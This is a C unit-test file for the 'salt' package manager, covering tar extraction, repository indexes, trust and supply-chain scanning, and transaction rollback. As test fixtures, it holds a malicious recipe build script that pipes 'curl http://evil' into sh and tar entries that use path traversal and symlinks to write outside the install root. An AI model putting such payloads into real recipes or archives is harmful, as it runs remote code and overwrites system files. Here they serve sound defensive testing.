#include "salt/util.h"
#include "salt/hash.h"
#include "salt/sign.h"
#include "salt/zst.h"
#include "salt/toml.h"
#include "salt/tar.h"
#include "salt/pkg.h"
#include "salt/archive.h"
#include "salt/db.h"
#include "salt/repo.h"
#include "salt/trust.h"
#include "salt/txn.h"
#include "salt/gc.h"
#include "salt/run.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int g_fail = 0;
static int g_total = 0;

#define CHECK(cond, msg)                                     \
  do {                                                       \
    g_total++;                                               \
    if (!(cond)) {                                           \
      printf("FAIL: %s (%s:%d)\n", msg, __FILE__, __LINE__); \
      g_fail++;                                              \
    }                                                        \
  } while (0)

static void test_buf(void) {
  salt_buf b;
  salt_buf_init(&b);
  salt_buf_append_str(&b, "hello");
  salt_buf_printf(&b, " %d %s", 42, "world");
  CHECK(strcmp(b.data, "hello 42 world") == 0, "buf printf");
  salt_buf_free(&b);
}

static void test_strlist(void) {
  salt_strlist l;
  salt_strlist_init(&l);
  salt_strlist_push(&l, "a");
  salt_strlist_push(&l, "b");
  CHECK(l.len == 2, "strlist len");
  CHECK(salt_strlist_contains(&l, "a"), "strlist contains");
  CHECK(!salt_strlist_contains(&l, "z"), "strlist not contains");
  salt_strlist_free(&l);
}

static void test_sha256(void) {
  char hex[SALT_SHA256_HEXLEN + 1];
  salt_sha256_buf("abc", 3, hex);
  CHECK(strcmp(hex, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
        "sha256 abc");
}

static void test_sign(void) {
  char pub[SALT_PUBKEY_HEXLEN + 1], sec[SALT_SECKEY_HEXLEN + 1], sig[SALT_SIG_HEXLEN + 1];
  CHECK(salt_keypair_generate(pub, sec) == SALT_OK, "keygen");
  const char *msg = "the quick brown fox";
  CHECK(salt_sign_buf(msg, strlen(msg), sec, sig) == SALT_OK, "sign");
  CHECK(salt_verify_buf(msg, strlen(msg), sig, pub) == SALT_OK, "verify ok");
  CHECK(salt_verify_buf("tampered", 8, sig, pub) != SALT_OK, "verify fail");
}

static void test_zst(void) {
  const char *data = "saltOS saltOS saltOS saltOS saltOS compress me please please please";
  salt_buf comp, dec;
  CHECK(salt_zst_compress(data, strlen(data), 19, &comp) == SALT_OK, "zst compress");
  CHECK(salt_zst_decompress(comp.data, comp.len, &dec) == SALT_OK, "zst decompress");
  CHECK(dec.len == strlen(data) && memcmp(dec.data, data, dec.len) == 0, "zst roundtrip");
  salt_buf_free(&comp);
  salt_buf_free(&dec);
}

static void test_toml(void) {
  const char *src =
      "name = \"zlib\"\n"
      "version = \"1.3.1\"\n"
      "release = 2\n"
      "arch = [\"x86_64\", \"aarch64\"]\n"
      "enabled = true\n"
      "[source]\n"
      "url = \"https://example.com/z.tar.gz\"\n"
      "[build]\n"
      "script = \"\"\"\nmake\nmake install\n\"\"\"\n"
      "[[package]]\nname = \"a\"\n[[package]]\nname = \"b\"\n";
  salt_toml *t = salt_toml_parse(src, strlen(src));
  CHECK(t != NULL, "toml parse");
  CHECK(strcmp(salt_toml_string(t, "name", ""), "zlib") == 0, "toml string");
  CHECK(salt_toml_int(t, "release", 0) == 2, "toml int");
  CHECK(salt_toml_bool(t, "enabled", false) == true, "toml bool");
  CHECK(strcmp(salt_toml_string(t, "source.url", ""), "https://example.com/z.tar.gz") == 0,
        "toml nested");
  salt_strlist arch;
  salt_strlist_init(&arch);
  salt_toml_string_array(t, "arch", &arch);
  CHECK(arch.len == 2 && strcmp(arch.items[1], "aarch64") == 0, "toml array");
  salt_strlist_free(&arch);
  const char *script = salt_toml_string(t, "build.script", "");
  CHECK(strstr(script, "make install") != NULL, "toml multiline");
  const salt_toml *pkgs = salt_toml_get(t, "package");
  CHECK(salt_toml_array_len(pkgs) == 2, "toml array-of-tables");
  salt_toml_free(t);
}

static void test_pkg_roundtrip(void) {
  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("zlib");
  m.version = salt_strdup("1.3.1");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.summary = salt_strdup("Compression");
  m.license = salt_strdup("Zlib");
  m.repro_status = salt_strdup("verified");
  salt_strlist_push(&m.deps, "glibc");
  salt_buf out;
  salt_pkg_meta_to_toml(&m, &out);
  salt_pkg_meta m2;
  salt_pkg_meta_from_toml(out.data, out.len, &m2);
  CHECK(strcmp(m2.name, "zlib") == 0 && m2.release == 1, "meta roundtrip");
  CHECK(m2.deps.len == 1 && strcmp(m2.deps.items[0], "glibc") == 0, "meta deps");
  char *fn = salt_pkg_filename(&m);
  CHECK(strcmp(fn, "zlib-1.3.1-1-x86_64.grain") == 0, "pkg filename");
  free(fn);
  salt_buf_free(&out);
  salt_pkg_meta_free(&m);
  salt_pkg_meta_free(&m2);
}

static void test_tar(void) {
  salt_buf out;
  salt_buf_init(&out);
  salt_tar_writer *w = salt_tar_writer_new(&out);
  const char *content = "file body";
  salt_tar_entry e = {
      "usr/share/long/path/to/a/file.txt", SALT_TAR_FILE, 0644, strlen(content), NULL, content};
  salt_tar_writer_add(w, &e);
  salt_tar_writer_finish(w);
  salt_tar_writer_free(w);

  char tmp[] = "/tmp/salt_tar_XXXXXX";
  char *d = mkdtemp(tmp);
  CHECK(d != NULL, "mkdtemp");
  salt_strlist inst;
  salt_strlist_init(&inst);
  CHECK(salt_tar_extract(out.data, out.len, d, &inst) == SALT_OK, "tar extract");
  char *full = salt_join_path(d, "usr/share/long/path/to/a/file.txt");
  salt_buf rd;
  CHECK(salt_read_file(full, &rd) == SALT_OK, "tar extracted file exists");
  CHECK(rd.len == strlen(content) && memcmp(rd.data, content, rd.len) == 0, "tar content");
  salt_buf_free(&rd);
  free(full);
  salt_strlist_free(&inst);
  salt_buf_free(&out);
  salt_remove_recursive(d);
}

static void tar_build(salt_buf *out, const salt_tar_entry *entries, size_t n) {
  salt_buf_init(out);
  salt_tar_writer *w = salt_tar_writer_new(out);
  for (size_t i = 0; i < n; i++) salt_tar_writer_add(w, &entries[i]);
  salt_tar_writer_finish(w);
  salt_tar_writer_free(w);
}

static void test_tar_confinement(void) {
  CHECK(salt_path_is_confined("usr/bin/x"), "confined plain path");
  CHECK(salt_path_is_confined("./usr/./bin"), "confined dot components");
  CHECK(!salt_path_is_confined("/etc/passwd"), "reject absolute path");
  CHECK(!salt_path_is_confined("../x"), "reject leading dotdot");
  CHECK(!salt_path_is_confined("usr/../../x"), "reject inner dotdot");
  CHECK(!salt_path_is_confined("usr/.."), "reject trailing dotdot");
  CHECK(!salt_path_is_confined(""), "reject empty path");
  CHECK(!salt_path_is_confined("."), "reject bare dot");

  char tmp[] = "/tmp/salt_tarx_XXXXXX";
  char *d = mkdtemp(tmp);
  CHECK(d != NULL, "mkdtemp");
  char *outside = salt_join_path(d, "outside");
  char *dest = salt_join_path(d, "root");
  salt_mkdirs(outside, 0755);
  salt_mkdirs(dest, 0755);
  char *victim = salt_join_path(outside, "pwned");

  salt_buf a;
  salt_tar_entry e1 = {"../outside/pwned", SALT_TAR_FILE, 0644, 3, NULL, "bad"};
  tar_build(&a, &e1, 1);
  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK, "tar rejects ../ entry");
  CHECK(!salt_path_exists(victim), "tar ../ did not write outside root");
  salt_buf_free(&a);

  salt_tar_entry e2 = {"/tmp/salt_abs_pwned", SALT_TAR_FILE, 0644, 3, NULL, "bad"};
  tar_build(&a, &e2, 1);
  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK, "tar rejects absolute entry");
  CHECK(!salt_path_exists("/tmp/salt_abs_pwned"), "tar absolute did not write");
  salt_buf_free(&a);

  salt_tar_entry e3[] = {
      {"usr/lib/evil", SALT_TAR_SYMLINK, 0777, 0, outside, NULL},
      {"usr/lib/evil/pwned", SALT_TAR_FILE, 0644, 3, NULL, "bad"},
  };
  tar_build(&a, e3, 2);
  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK,
        "tar rejects write through planted symlink");
  CHECK(!salt_path_exists(victim), "tar symlink hop did not write outside root");
  salt_buf_free(&a);

  salt_tar_entry e4[] = {
      {"usr/share", SALT_TAR_DIR, 0755, 0, NULL, NULL},
      {"usr/lib/inside", SALT_TAR_SYMLINK, 0777, 0, "../share", NULL},
      {"usr/lib/inside/ok.txt", SALT_TAR_FILE, 0644, 2, NULL, "ok"},
      {"bin", SALT_TAR_SYMLINK, 0777, 0, "usr/bin", NULL},
      {"./usr/bin/tool", SALT_TAR_FILE, 0755, 2, NULL, "ok"},
  };
  tar_build(&a, e4, 5);
  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) == SALT_OK,
        "tar allows in-root relative symlink hop");
  char *okp = salt_join_path(dest, "usr/share/ok.txt");
  char *toolp = salt_join_path(dest, "bin/tool");
  CHECK(salt_path_exists(okp), "in-root symlink hop wrote inside root");
  CHECK(salt_path_exists(toolp), "./ prefixed entry extracted");
  free(okp);
  free(toolp);
  salt_buf_free(&a);

  char trunc[1024];
  static char big[4096];
  memset(trunc, 0, sizeof(trunc));
  salt_tar_entry e5 = {"usr/big", SALT_TAR_FILE, 0644, sizeof(big), NULL, big};
  tar_build(&a, &e5, 1);
  memcpy(trunc, a.data, 512);
  CHECK(salt_tar_extract(trunc, sizeof(trunc), dest, NULL) != SALT_OK,
        "tar rejects size past end of archive");
  salt_buf_free(&a);

  free(victim);
  free(outside);
  free(dest);
  salt_remove_recursive(d);
}

static void test_archive_db(void) {
  char tmp[] = "/tmp/salt_arch_XXXXXX";
  char *d = mkdtemp(tmp);
  char *staging = salt_join_path(d, "staging");
  char *binp = salt_join_path(staging, "usr/bin/hello");
  salt_write_file(binp, "#!/bin/sh\necho hi\n", 18, 0755);
  char *etcp = salt_join_path(staging, "etc/hello.conf");
  salt_write_file(etcp, "k=v\n", 4, 0644);

  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("hello");
  m.version = salt_strdup("1.0");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.license = salt_strdup("MIT");
  m.repro_status = salt_strdup("verified");

  salt_archive ar;
  CHECK(salt_archive_build_from_dir(staging, &m, NULL, &ar) == SALT_OK, "archive build");
  CHECK(ar.manifest.len >= 2, "archive manifest");
  char *pkgpath = salt_join_path(d, "hello-1.0-1-x86_64.grain");
  CHECK(salt_archive_write(&ar, pkgpath) == SALT_OK, "archive write");

  salt_archive ar2;
  CHECK(salt_archive_open(pkgpath, &ar2) == SALT_OK, "archive open");
  CHECK(strcmp(ar2.meta.name, "hello") == 0, "archive meta");

  char *root = salt_join_path(d, "root");
  salt_strlist inst;
  salt_strlist_init(&inst);
  CHECK(salt_archive_extract_payload(&ar2, root, &inst) == SALT_OK, "archive extract");
  char *installed_bin = salt_join_path(root, "usr/bin/hello");
  CHECK(salt_path_exists(installed_bin), "extracted bin exists");

  char *dbp = salt_join_path(d, "db.sqlite");
  salt_db *db;
  CHECK(salt_db_open(dbp, &db) == SALT_OK, "db open");
  int64_t txn;
  salt_db_txn_new(db, "install", &txn);
  CHECK(salt_db_record_install(db, &ar2.meta, &ar2.manifest, "current", "signed", txn) == SALT_OK,
        "db record install");
  salt_db_txn_finish(db, txn, "ok");
  CHECK(salt_db_is_installed(db, "hello"), "db installed");
  char *owner = NULL;
  CHECK(salt_db_owner(db, "usr/bin/hello", &owner) == SALT_OK && strcmp(owner, "hello") == 0,
        "db owner");
  free(owner);
  salt_strlist files;
  salt_strlist_init(&files);
  salt_db_pkg_files(db, "hello", &files);
  CHECK(files.len >= 2, "db files");
  salt_strlist_free(&files);
  CHECK(salt_db_record_remove(db, "hello", txn) == SALT_OK, "db remove");
  CHECK(!salt_db_is_installed(db, "hello"), "db removed");
  salt_db_close(db);

  salt_strlist_free(&inst);
  salt_archive_free(&ar);
  salt_archive_free(&ar2);
  salt_pkg_meta_free(&m);
  free(staging);
  free(binp);
  free(etcp);
  free(pkgpath);
  free(root);
  free(installed_bin);
  free(dbp);
  salt_remove_recursive(d);
}

static void test_repo(void) {
  char tmp[] = "/tmp/salt_repo_XXXXXX";
  char *d = mkdtemp(tmp);
  char *pkgdir = salt_join_path(d, "packages");
  char *staging = salt_join_path(d, "st");
  char *f = salt_join_path(staging, "usr/bin/x");
  salt_write_file(f, "x", 1, 0755);
  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("x");
  m.version = salt_strdup("1");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.license = salt_strdup("MIT");
  m.repro_status = salt_strdup("verified");
  salt_archive ar;
  salt_archive_build_from_dir(staging, &m, NULL, &ar);
  char *pp = salt_join_path(pkgdir, "x-1-1-x86_64.grain");
  salt_archive_write(&ar, pp);

  salt_repo_index idx;
  CHECK(salt_repo_build_index(pkgdir, "current", "x86_64", &idx) == SALT_OK, "repo build index");
  CHECK(idx.len == 1 && strcmp(idx.items[0].name, "x") == 0, "repo index entry");
  CHECK(strlen(idx.items[0].sha256) == 64, "repo index sha");

  salt_buf toml;
  salt_repo_index_to_toml(&idx, &toml);
  char *idxpath = salt_join_path(d, "index.toml");
  salt_write_file(idxpath, toml.data, toml.len, 0644);
  salt_repo_index loaded;
  CHECK(salt_repo_index_load(idxpath, &loaded) == SALT_OK, "repo index load");
  CHECK(loaded.len == 1, "repo index reload");
  CHECK(salt_repo_index_find(&loaded, "x") != NULL, "repo index find");
  CHECK(loaded.items[0].url == NULL, "repo index url absent");

  CHECK(salt_repo_publish(d, "current", "x86_64", "https://example.invalid/releases/download/v1/",
                          "") == SALT_OK,
        "repo publish with url base");
  salt_repo_index withurl;
  CHECK(salt_repo_index_load(idxpath, &withurl) == SALT_OK, "repo index load (url)");
  CHECK(withurl.len == 1 && withurl.items[0].url &&
            strcmp(withurl.items[0].url,
                   "https://example.invalid/releases/download/v1/x-1-1-x86_64.grain") == 0,
        "repo index url");
  salt_repo_index_free(&withurl);

  salt_buf_free(&toml);
  salt_repo_index_free(&idx);
  salt_repo_index_free(&loaded);
  salt_archive_free(&ar);
  salt_pkg_meta_free(&m);
  free(pkgdir);
  free(staging);
  free(f);
  free(pp);
  free(idxpath);
  salt_remove_recursive(d);
}

static void test_trust(void) {
  char tmp[] = "/tmp/salt_trust_XXXXXX";
  char *d = mkdtemp(tmp);
  char *tdb = salt_join_path(d, "trust.toml");
  salt_trust_set(tdb, "root", SALT_TRUST_MAINTAINER, "self", "founder");
  CHECK(salt_trust_lookup(tdb, "root") == SALT_TRUST_MAINTAINER, "trust set/lookup");
  CHECK(salt_trust_vouch(tdb, "root", "alice", "good work") == SALT_OK, "trust vouch");
  CHECK(salt_trust_lookup(tdb, "alice") == SALT_TRUST_VOUCHED, "trust vouched level");
  CHECK(salt_trust_lookup(tdb, "nobody") == SALT_TRUST_UNKNOWN, "trust unknown");

  char *rdir = salt_join_path(d, "recipe");
  char *rfile = salt_join_path(rdir, "recipe.toml");
  const char *good =
      "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\",\"aarch64\"]\n"
      "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\n"
      "sha256=\"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\"\n"
      "[build]\ndeps=[\"gcc\"]\n[reproducibility]\nstatus=\"verified\"\n";
  salt_write_file(rfile, good, strlen(good), 0644);
  salt_findings lf;
  salt_findings_init(&lf);
  salt_recipe_lint(rdir, &lf);
  CHECK(!salt_findings_has_block(&lf), "lint clean recipe");
  salt_findings_free(&lf);

  const char *bad =
      "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\"]\n"
      "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\nsha256=\"x\"\n"
      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho "
      "0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
  salt_write_file(rfile, bad, strlen(bad), 0644);
  salt_findings sf;
  salt_findings_init(&sf);
  salt_scan_input in;
  memset(&in, 0, sizeof(in));
  in.recipe_path = rdir;
  in.author_level = SALT_TRUST_UNKNOWN;
  salt_supplychain_scan(&in, &sf);
  CHECK(salt_findings_has_block(&sf), "scan flags wallet/block");
  salt_findings_free(&sf);

  free(tdb);
  free(rdir);
  free(rfile);
  salt_remove_recursive(d);
}

static void build_pkg(const char *d, const char *name, const char *version, const char *dep,
                      const char *conflict, salt_archive *ar, char **path_out) {
  char *staging = salt_join_path(d, name);
  char *rel = salt_join_path("usr/bin", name);
  char *f = salt_join_path(staging, rel);
  salt_write_file(f, name, strlen(name), 0755);
  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup(name);
  m.version = salt_strdup(version);
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.summary = salt_strdup("unit fixture");
  m.license = salt_strdup("MIT");
  m.repro_status = salt_strdup("verified");
  if (dep) salt_strlist_push(&m.deps, dep);
  if (conflict) salt_strlist_push(&m.conflicts, conflict);
  CHECK(salt_archive_build_from_dir(staging, &m, NULL, ar) == SALT_OK, "fixture archive build");
  salt_buf fn;
  salt_buf_init(&fn);
  salt_buf_printf(&fn, "%s-%s-1-x86_64.grain", name, version);
  char *pkgdir = salt_join_path(d, "packages");
  *path_out = salt_join_path(pkgdir, fn.data);
  CHECK(salt_archive_write(ar, *path_out) == SALT_OK, "fixture archive write");
  salt_buf_free(&fn);
  salt_pkg_meta_free(&m);
  free(pkgdir);
  free(staging);
  free(rel);
  free(f);
}

static void test_repo_verify(void) {
  CHECK(salt_sha256_hex_valid("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"),
        "sha256 hex valid");
  CHECK(!salt_sha256_hex_valid("TODO-sha256"), "sha256 placeholder rejected");
  CHECK(!salt_sha256_hex_valid(NULL), "sha256 null rejected");
  CHECK(!salt_sha256_hex_valid(""), "sha256 empty rejected");
  CHECK(!salt_sha256_hex_valid("BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD"),
        "sha256 uppercase rejected");
  CHECK(!salt_sha256_hex_valid("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015a"),
        "sha256 short rejected");

  const char *good =
      "repo = \"current\"\narch = \"x86_64\"\n"
      "[[package]]\nname = \"a\"\nversion = \"1\"\nrelease = 1\narch = \"x86_64\"\n"
      "filename = \"a-1-1-x86_64.grain\"\n"
      "sha256 = \"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\"\n"
      "size = 1\nsummary = \"first\"\ndeps = []\nconflicts = [\"b\"]\n"
      "[[package]]\nname = \"a\"\nversion = \"2\"\nrelease = 3\narch = \"x86_64\"\n"
      "filename = \"a-2-3-x86_64.grain\"\n"
      "sha256 = \"7898876d3e55c3a65154e802d3d7c05745984d4a2ea8b46f49c72f1c5b3c98d4\"\n"
      "size = 1\ndeps = []\n";
  char tmp[] = "/tmp/salt_idx_XXXXXX";
  char *d = mkdtemp(tmp);
  char *ip = salt_join_path(d, "index.toml");
  salt_write_file(ip, good, strlen(good), 0644);
  salt_repo_index idx;
  CHECK(salt_repo_index_load(ip, &idx) == SALT_OK, "index load");
  salt_strlist problems;
  salt_strlist_init(&problems);
  CHECK(salt_repo_index_verify(&idx, &problems) == SALT_OK && problems.len == 0,
        "index with hashes verifies");
  const salt_repo_entry *e = salt_repo_index_find_exact(&idx, "a", "2", 3);
  CHECK(e && strcmp(e->filename, "a-2-3-x86_64.grain") == 0, "find exact version/release");
  CHECK(salt_repo_index_find_exact(&idx, "a", "2", 1) == NULL, "find exact misses wrong release");
  e = salt_repo_index_find_exact(&idx, "a", "1", 1);
  CHECK(e && e->conflicts.len == 1 && strcmp(e->conflicts.items[0], "b") == 0,
        "index conflicts loaded");
  CHECK(e->summary && strcmp(e->summary, "first") == 0, "index summary loaded");
  salt_strlist_free(&problems);
  salt_repo_index_free(&idx);

  const char *placeholder =
      "repo = \"current\"\narch = \"x86_64\"\n"
      "[[package]]\nname = \"a\"\nversion = \"1\"\nrelease = 1\narch = \"x86_64\"\n"
      "filename = \"a-1-1-x86_64.grain\"\nsha256 = \"TODO-sha256\"\nsize = 1\n"
      "[[package]]\nname = \"b\"\nversion = \"1\"\nrelease = 1\narch = \"x86_64\"\n"
      "filename = \"b-1-1-x86_64.grain\"\nsize = 1\n";
  salt_write_file(ip, placeholder, strlen(placeholder), 0644);
  CHECK(salt_repo_index_load(ip, &idx) == SALT_OK, "index load placeholder");
  salt_strlist_init(&problems);
  CHECK(salt_repo_index_verify(&idx, &problems) != SALT_OK, "placeholder/missing sha256 fails");
  CHECK(problems.len == 2, "one problem per bad entry");
  CHECK(!salt_repo_entry_hash_ok(&idx.items[0]), "placeholder entry hash not ok");
  CHECK(!salt_repo_entry_hash_ok(&idx.items[1]), "missing entry hash not ok");
  salt_strlist_free(&problems);
  salt_repo_index_free(&idx);
  free(ip);
  salt_remove_recursive(d);
}

static void test_db_deps_conflicts(void) {
  char tmp[] = "/tmp/salt_deps_XXXXXX";
  char *d = mkdtemp(tmp);
  salt_archive lib, app, rival;
  char *libp, *appp, *rivalp;
  build_pkg(d, "lib", "1.0", NULL, NULL, &lib, &libp);
  build_pkg(d, "app", "1.0", "lib", NULL, &app, &appp);
  build_pkg(d, "rival", "1.0", NULL, "app", &rival, &rivalp);

  char *dbp = salt_join_path(d, "db.sqlite");
  salt_db *db;
  CHECK(salt_db_open(dbp, &db) == SALT_OK, "deps db open");
  int64_t txn;
  salt_db_txn_new(db, "install", &txn);
  CHECK(salt_db_record_install(db, &lib.meta, &lib.manifest, "current", "signed", txn) == SALT_OK,
        "record lib");
  CHECK(salt_db_record_install(db, &app.meta, &app.manifest, "current", "signed", txn) == SALT_OK,
        "record app");
  CHECK(
      salt_db_record_install(db, &rival.meta, &rival.manifest, "current", "signed", txn) == SALT_OK,
      "record rival");
  CHECK(salt_db_set_pkg_artifact(
            db, "lib", "lib-1.0-1-x86_64.grain",
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == SALT_OK,
        "set artifact");
  salt_db_txn_finish(db, txn, "ok");

  salt_strlist l;
  salt_strlist_init(&l);
  salt_db_pkg_deps(db, "app", &l);
  CHECK(l.len == 1 && strcmp(l.items[0], "lib") == 0, "pkg deps");
  salt_strlist_free(&l);
  salt_strlist_init(&l);
  salt_db_revdeps(db, "lib", &l);
  CHECK(l.len == 1 && strcmp(l.items[0], "app") == 0, "revdeps");
  salt_strlist_free(&l);
  salt_strlist_init(&l);
  salt_db_conflicts_with(db, "app", &l);
  CHECK(l.len == 1 && strcmp(l.items[0], "rival") == 0, "conflicts_with");
  salt_strlist_free(&l);

  salt_db_pkg p;
  CHECK(salt_db_get_pkg(db, "lib", &p) == SALT_OK, "get pkg");
  CHECK(p.sha256 && strcmp(p.sha256,
                           "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
        "artifact sha256 persisted");
  CHECK(p.filename && strcmp(p.filename, "lib-1.0-1-x86_64.grain") == 0,
        "artifact filename persisted");
  CHECK(p.summary && strcmp(p.summary, "unit fixture") == 0, "summary persisted");
  salt_db_pkg_free_fields(&p);

  salt_db_pkglist found;
  salt_db_pkglist_init(&found);
  salt_db_search(db, "%fixture%", &found);
  CHECK(found.len == 3, "db search matches summaries");
  salt_db_pkglist_free(&found);

  char *snap = salt_join_path(d, "db.before");
  CHECK(salt_db_vacuum_into(db, snap) == SALT_OK, "vacuum into snapshot");
  salt_strlist names;
  salt_strlist_init(&names);
  CHECK(salt_db_snapshot_filenames(snap, &names) == SALT_OK, "snapshot filenames");
  CHECK(names.len == 1 && strcmp(names.items[0], "lib-1.0-1-x86_64.grain") == 0,
        "snapshot lists referenced artifact");
  salt_strlist_free(&names);

  int64_t txn2;
  salt_db_txn_new(db, "remove", &txn2);
  CHECK(salt_db_record_remove(db, "rival", txn2) == SALT_OK, "remove rival");
  salt_strlist_init(&l);
  salt_db_conflicts_with(db, "app", &l);
  CHECK(l.len == 0, "conflict rows removed with package");
  salt_strlist_free(&l);
  salt_db_txn_finish(db, txn2, "ok");

  CHECK(salt_db_restore_state_from(db, snap) == SALT_OK, "restore state from snapshot");
  CHECK(salt_db_is_installed(db, "rival"), "restore brings package back");
  salt_strlist_init(&l);
  salt_db_conflicts_with(db, "app", &l);
  CHECK(l.len == 1, "restore brings conflict rows back");
  salt_strlist_free(&l);
  CHECK(
      salt_db_get_pkg(db, "lib", &p) == SALT_OK && p.sha256 &&
          strcmp(p.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
      "restore keeps artifact sha256");
  salt_db_pkg_free_fields(&p);

  salt_db_close(db);
  salt_archive_free(&lib);
  salt_archive_free(&app);
  salt_archive_free(&rival);
  free(libp);
  free(appp);
  free(rivalp);
  free(dbp);
  free(snap);
  salt_remove_recursive(d);
}

static void test_txn_rollback(void) {
  char tmp[] = "/tmp/salt_txn_XXXXXX";
  char *d = mkdtemp(tmp);
  char *root = salt_join_path(d, "root");
  salt_mkdirs(root, 0755);
  salt_archive one, two;
  char *onep, *twop;
  build_pkg(d, "tool", "1.0", NULL, NULL, &one, &onep);
  build_pkg(d, "tool", "2.0", NULL, NULL, &two, &twop);

  salt_ctx ctx;
  CHECK(salt_ctx_init(&ctx, root) == SALT_OK, "ctx init");
  salt_db *db;
  CHECK(salt_db_open(ctx.db_path, &db) == SALT_OK, "txn db open");

  int64_t t1;
  salt_db_txn_new(db, "install", &t1);
  char *snap = NULL;
  salt_snapshot_create(&ctx, db, t1, &snap);
  if (snap) salt_db_txn_set_snapshot(db, t1, snap);
  free(snap);
  CHECK(salt_install_archive(&ctx, db, &one, "current", "signed", t1) == SALT_OK, "install 1.0");
  salt_db_txn_finish(db, t1, "ok");
  char *bin = salt_join_path(root, "usr/bin/tool");
  salt_buf content;
  salt_buf_init(&content);
  CHECK(salt_read_file(bin, &content) == SALT_OK && content.len == 4 &&
            memcmp(content.data, "tool", 4) == 0,
        "1.0 payload on disk");
  salt_buf_free(&content);

  int64_t t2;
  salt_db_txn_new(db, "update", &t2);
  snap = NULL;
  salt_snapshot_create(&ctx, db, t2, &snap);
  if (snap) salt_db_txn_set_snapshot(db, t2, snap);
  free(snap);
  CHECK(salt_db_sql_begin(db) == SALT_OK, "sql begin");
  CHECK(salt_install_archive(&ctx, db, &two, "current", "signed", t2) == SALT_OK, "install 2.0");
  salt_db_pkg p;
  CHECK(salt_db_get_pkg(db, "tool", &p) == SALT_OK && strcmp(p.version, "2.0") == 0,
        "db sees 2.0 inside transaction");
  salt_db_pkg_free_fields(&p);
  CHECK(salt_db_sql_rollback(db) == SALT_OK, "sql rollback");
  CHECK(salt_txn_revert_files(&ctx, t2) == SALT_OK, "revert files");
  salt_db_txn_finish(db, t2, "failed");
  CHECK(salt_db_get_pkg(db, "tool", &p) == SALT_OK && strcmp(p.version, "1.0") == 0,
        "db back to 1.0 after failed transaction");
  salt_db_pkg_free_fields(&p);
  salt_buf_init(&content);
  CHECK(salt_read_file(bin, &content) == SALT_OK && content.len == 4, "1.0 payload restored");
  salt_buf_free(&content);

  char *blocker = salt_join_path(root, "usr/share");
  salt_write_file(blocker, "x", 1, 0644);
  salt_archive three;
  char *threep;
  char *staging = salt_join_path(d, "blocked");
  char *deep = salt_join_path(staging, "usr/share/blocked/file");
  salt_write_file(deep, "y", 1, 0644);
  salt_pkg_meta m;
  salt_pkg_meta_init(&m);
  m.name = salt_strdup("blocked");
  m.version = salt_strdup("1.0");
  m.release = 1;
  m.arch = salt_strdup("x86_64");
  m.license = salt_strdup("MIT");
  m.repro_status = salt_strdup("verified");
  CHECK(salt_archive_build_from_dir(staging, &m, NULL, &three) == SALT_OK, "blocked archive");
  threep = salt_join_path(d, "blocked.grain");
  int64_t t3;
  salt_db_txn_new(db, "install", &t3);
  CHECK(salt_db_sql_begin(db) == SALT_OK, "sql begin 3");
  CHECK(salt_install_archive(&ctx, db, &three, "current", "signed", t3) != SALT_OK,
        "install fails when a path component is a file");
  salt_db_sql_rollback(db);
  CHECK(salt_txn_revert_files(&ctx, t3) == SALT_OK, "revert after extraction failure");
  salt_db_txn_finish(db, t3, "failed");
  CHECK(!salt_db_is_installed(db, "blocked"), "failed install not recorded");
  CHECK(salt_db_is_installed(db, "tool"), "other packages untouched");

  int64_t t4;
  salt_db_txn_new(db, "remove", &t4);
  snap = NULL;
  salt_snapshot_create(&ctx, db, t4, &snap);
  if (snap) salt_db_txn_set_snapshot(db, t4, snap);
  free(snap);
  CHECK(salt_remove_pkg(&ctx, db, "tool", t4) == SALT_OK, "remove tool");
  salt_db_txn_finish(db, t4, "ok");
  CHECK(!salt_path_exists(bin), "removed file gone");
  CHECK(salt_rollback_last(&ctx, db) == SALT_OK, "rollback last");
  CHECK(salt_path_exists(bin) && salt_db_is_installed(db, "tool"), "rollback restores file and db");

  salt_deployment_list deps;
  salt_deployment_list_init(&deps);
  salt_db_deployments(db, &deps);
  size_t before = deps.len;
  salt_deployment_list_free(&deps);
  salt_gc_opts opts = {.keep = 1, .pinned = NULL, .npinned = 0, .dry_run = true};
  salt_gc_report rep;
  salt_gc_report_init(&rep);
  CHECK(salt_gc_run(&ctx, db, &opts, &rep) == SALT_OK, "gc dry run");
  CHECK(rep.generations_removed > 0, "gc dry run finds prunable generations");
  salt_deployment_list_init(&deps);
  salt_db_deployments(db, &deps);
  CHECK(deps.len == before, "gc dry run changes nothing");
  bool any_pruned = false;
  for (size_t i = 0; i < deps.len; i++)
    if (strcmp(deps.items[i].status, "pruned") == 0) any_pruned = true;
  CHECK(!any_pruned, "gc dry run marks nothing pruned");
  salt_deployment_list_free(&deps);
